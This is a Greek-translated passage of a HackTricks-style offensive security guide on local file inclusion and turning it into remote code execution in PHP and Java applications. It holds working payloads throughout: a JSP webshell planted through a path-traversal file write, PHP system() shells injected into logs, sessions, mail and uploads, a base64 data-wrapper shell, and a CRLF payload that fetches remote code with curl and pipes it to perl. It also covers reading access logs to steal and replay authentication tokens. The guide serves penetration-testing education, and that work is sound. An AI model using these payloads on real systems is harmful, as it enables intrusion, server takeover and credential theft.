Είναι σημαντικό να **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Αυτή η τεχνική είναι σχετική σε περιπτώσεις όπου έχετε τον έλεγχο της **file path** μιας **PHP function** που θα **access a file**, αλλά δεν θα δείτε το περιεχόμενο του αρχείου (π.χ. μια απλή κλήση σε **`file()`**) και το περιεχόμενο δεν εμφανίζεται.

Στο [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) εξηγείται πώς ένα blind path traversal μπορεί να εκμεταλλευτείται μέσω PHP filter για να **exfiltrate the content of a file via an error oracle**.

Συνοπτικά, η τεχνική χρησιμοποιεί την **"UCS-4LE" encoding** για να κάνει το περιεχόμενο ενός αρχείου τόσο **μεγάλο** που η PHP function που ανοίγει το αρχείο θα προκαλέσει ένα **σφάλμα**.

Έπειτα, για να leak ο πρώτος χαρακτήρας χρησιμοποιείται το φίλτρο **`dechunk`** μαζί με άλλα όπως **base64** ή **rot13** και τελικά χρησιμοποιούνται τα φίλτρα **convert.iconv.UCS-4.UCS-4LE** και **convert.iconv.UTF16.UTF-16BE** για να τοποθετήσουν άλλους chars στην αρχή και να leak αυτούς.

Functions that might be vulnerable: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Για τις τεχνικές λεπτομέρειες ελέγξτε το αναφερόμενο post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Όταν server-side κώδικας που επεξεργάζεται/ανεβάζει αρχεία κατασκευάζει το destination path χρησιμοποιώντας δεδομένα ελεγχόμενα από τον χρήστη (π.χ. filename ή URL) χωρίς canonicalising και validation, τα `..` segments και absolute paths μπορούν να διαφύγουν τον προοριζόμενο κατάλογο και να προκαλέσουν arbitrary file write. Αν μπορείτε να τοποθετήσετε το payload κάτω από έναν web-exposed directory, συνήθως αποκτάτε unauthenticated RCE ρίχνοντας ένα webshell.

Typical exploitation workflow:
- Εντοπίστε ένα write primitive σε ένα endpoint ή background worker που δέχεται path/filename και γράφει περιεχόμενο στο δίσκο (π.χ. message-driven ingestion, XML/JSON command handlers, ZIP extractors, κ.λπ.).
- Προσδιορίστε web-exposed directories. Συνηθισμένα παραδείγματα:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Δημιουργήστε ένα traversal path που σπάει έξω από τον προοριζόμενο storage directory προς το webroot, και συμπεριλάβετε το webshell περιεχόμενό σας.
- Περιηγηθείτε στο dropped payload και εκτελέστε εντολές.

Σημειώσεις:
- Η ευπαθής υπηρεσία που πραγματοποιεί το write μπορεί να ακούει σε μη-HTTP port (π.χ. ένας JMF XML listener στο TCP 4004). Το κύριο web portal (σε διαφορετικό port) θα σερβίρει αργότερα το payload σας.
- Σε Java stacks, αυτές οι εγγραφές αρχείων συχνά υλοποιούνται με απλή `File`/`Paths` concatenation. Η έλλειψη canonicalisation/allow-listing είναι το βασικό σφάλμα.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening που εξουδετερώνει αυτή την κλάση σφαλμάτων:
- Επιλύστε σε canonical path και επιβάλετε ότι είναι απόγονος ενός allow-listed base directory.
- Απορρίψτε οποιοδήποτε path περιέχει `..`, absolute roots, ή drive letters· προτιμήστε generated filenames.
- Τρέξτε τον writer ως low-privileged account και διαχωρίστε write directories από τα served roots.

## Remote File Inclusion

Εξηγήθηκε προηγουμένως, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Σημειώστε ότι **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Επίσης, βεβαιωθείτε ότι **write correctly the payload** ή PHP θα εμφανίσει σφάλμα κάθε φορά που θα προσπαθεί να φορτώσει το log file και δεν θα έχετε δεύτερη ευκαιρία.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Άλλες πιθανές διαδρομές logs:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Ανάγνωση αρχείων καταγραφής πρόσβασης για συλλογή GET-based auth tokens (token replay)

Πολλές εφαρμογές αποδέχονται κατά λάθος session/auth tokens μέσω GET (π.χ. AuthenticationToken, token, sid). Αν έχετε ένα path traversal/LFI primitive που σας δίνει πρόσβαση στα web server logs, μπορείτε να κλέψετε αυτά τα tokens από τα access logs και να τα χρησιμοποιήσετε (token replay) για πλήρη παράκαμψη του authentication.

How-to:
- Χρησιμοποιήστε το traversal/LFI για να διαβάσετε το web server access log. Συνήθεις τοποθεσίες:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Ορισμένα endpoints επιστρέφουν τα αρχεία που διαβάζονται κωδικοποιημένα με Base64. Αν συμβαίνει αυτό, decode τοπικά και ελέγξτε τις γραμμές του log.
- Grep για GET requests που περιλαμβάνουν παράμετρο token και καταγράψτε την τιμή της, στη συνέχεια replay την στο application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Αποκωδικοποιήστε το body αν είναι Base64, στη συνέχεια replay a captured token:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Notes:
- Tokens που εμφανίζονται σε URLs καταγράφονται από προεπιλογή· μην αποδέχεστε ποτέ bearer tokens μέσω GET σε παραγωγικά συστήματα.
- Αν η εφαρμογή υποστηρίζει πολλαπλά ονόματα token, ψάξτε για κοινά κλειδιά όπως AuthenticationToken, token, sid, access_token.
- Ανανεώστε οποιαδήποτε tokens ενδέχεται να have leaked στα logs.

### Μέσω Email

**Στείλτε ένα μήνυμα** σε έναν εσωτερικό λογαριασμό (user@localhost) που περιέχει το PHP payload σας όπως `<?php echo system($_REQUEST["cmd"]); ?>` και προσπαθήστε να το include στο mail του χρήστη με μονοπάτι όπως **`/var/mail/<USERNAME>`** ή **`/var/spool/mail/<USERNAME>`**

### Μέσω /proc/*/fd/*

1. Ανεβάστε πολλά shells (π.χ.: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), με $PID = PID της διεργασίας (μπορεί να βρεθεί με brute force) και $FD ο file descriptor (μπορεί κι αυτός να βρεθεί με brute force)

### Μέσω /proc/self/environ

Όπως σε ένα log file, στείλτε το payload στο User-Agent, θα αντανακλάται μέσα στο /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Μέσω upload

Εάν μπορείτε να upload ένα αρχείο, απλώς εισάγετε μέσα του το shell payload (π.χ : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Για να παραμείνει το αρχείο ευανάγνωστο, είναι προτιμότερο να εγχυθεί στα μεταδεδομένα των εικόνων/doc/pdf

### Μέσω Zip file upload

Ανεβάστε ένα ZIP αρχείο που περιέχει ένα συμπιεσμένο PHP shell και αποκτήστε πρόσβαση:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Μέσω PHP sessions

Ελέγξτε αν ο ιστότοπος χρησιμοποιεί PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Στο PHP αυτές οι sessions αποθηκεύονται στα _/var/lib/php5/sess\\_\[PHPSESSID]\_ αρχεία
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ορίστε το cookie σε `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Χρησιμοποιήστε το LFI για να συμπεριλάβετε το αρχείο session του PHP.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Μέσω ssh

Εάν το ssh είναι ενεργό, έλεγξε ποιος χρήστης χρησιμοποιείται (/proc/self/status & /etc/passwd) και προσπάθησε να αποκτήσεις πρόσβαση σε **\<HOME>/.ssh/id_rsa**

### **Μέσω** **vsftpd** _**logs**_

Τα αρχεία καταγραφής για τον FTP server vsftpd βρίσκονται στο _**/var/log/vsftpd.log**_. Στην περίπτωση που υπάρχει ευπάθεια Local File Inclusion (LFI) και είναι δυνατή η πρόσβαση σε έναν εκτεθειμένο vsftpd server, μπορούν να ληφθούν υπόψη τα ακόλουθα βήματα:

1. Εγχύστε ένα PHP payload στο πεδίο username κατά τη διαδικασία login.
2. Αφού γίνει injection, χρησιμοποίησε το LFI για να ανακτήσεις τα server logs από _**/var/log/vsftpd.log**_.

### Μέσω php base64 filter (using base64)

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64.You can use that to bypass the file extension check: if you supply base64 that ends with ".php", and it would just ignore the "." and append "php" to the base64. Here is an example payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Μέσω php filters (χωρίς αρχείο)

Αυτό το [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) εξηγεί ότι μπορείτε να χρησιμοποιήσετε **php filters** για να παράγετε αυθαίρετο περιεχόμενο ως έξοδο. Αυτό ουσιαστικά σημαίνει ότι μπορείτε να παράγετε αυθαίρετο php code για το include χωρίς να χρειάζεται να το γράψετε σε αρχείο.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Μέσω segmentation fault

**Upload** ένα αρχείο που θα αποθηκευτεί ως **temporary** στο `/tmp`, στη συνέχεια στο **ίδιο αίτημα** προκαλέστε ένα **segmentation fault**, και τότε το **temporary file δεν θα διαγραφεί** και μπορείτε να το εντοπίσετε.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Μέσω Nginx temp file storage

Αν βρήκατε μια **Local File Inclusion** και ο **Nginx** τρέχει μπροστά από το PHP, ίσως καταφέρετε να αποκτήσετε RCE με την παρακάτω τεχνική:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Μέσω PHP_SESSION_UPLOAD_PROGRESS

Αν βρήκατε μια **Local File Inclusion** ακόμη και αν **δεν έχετε session** και `session.auto_start` είναι `Off`. Αν παρέχετε το **`PHP_SESSION_UPLOAD_PROGRESS`** στα **multipart POST** δεδομένα, το PHP θα **ενεργοποιήσει το session για εσάς**. Μπορείτε να το καταχραστείτε για να αποκτήσετε RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Μέσω temp file uploads στα Windows

Αν βρήκατε μια **Local File Inclusion** και ο server τρέχει σε **Windows**, ίσως αποκτήσετε RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Μέσω `pearcmd.php` + URL args

Όπως [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), το script `/usr/local/lib/phppearcmd.php` υπάρχει από προεπιλογή σε php docker images. Επιπλέον, είναι δυνατόν να περάσετε arguments στο script μέσω του URL επειδή αναφέρεται ότι αν μια URL παράμετρος δεν έχει `=`, θα χρησιμοποιηθεί ως argument. Δείτε επίσης [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) και [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Το ακόλουθο αίτημα δημιουργεί ένα αρχείο στο `/tmp/hello.php` με το περιεχόμενο `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Το παρακάτω εκμεταλλεύεται μια CRLF vuln για να αποκτήσει RCE (από [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Μέσω phpinfo() (file_uploads = on)

Εάν βρήκατε ένα **Local File Inclusion** και ένα αρχείο που αποκαλύπτει **phpinfo()** με file_uploads = on μπορείτε να αποκτήσετε RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Μέσω compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Εάν βρήκατε ένα **Local File Inclusion** και **can exfiltrate the path** of the temp file ΑΛΛΑ ο **server** **is checking** αν το **file to be included has PHP marks**, μπορείτε να προσπαθήσετε να **bypass that check** με αυτή τη **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Μέσω eternal waiting + bruteforce

Εάν μπορείτε να καταχραστείτε το LFI για να **upload temporary files** και να κάνετε τον server να **hang** την εκτέλεση PHP, τότε θα μπορούσατε να **brute force filenames during hours** για να βρείτε το προσωρινό αρχείο:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Σε Fatal Error

Αν συμπεριλάβετε οποιοδήποτε από τα αρχεία `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Πρέπει να συμπεριλάβετε το ίδιο δύο φορές για να προκαλέσετε αυτό το σφάλμα).

**Δεν ξέρω πόσο χρήσιμο είναι αυτό αλλά μπορεί να είναι.**\
_Ακόμα και αν προκαλέσετε ένα PHP Fatal Error, τα PHP προσωρινά αρχεία που ανέβηκαν διαγράφονται._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Αναφορές

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
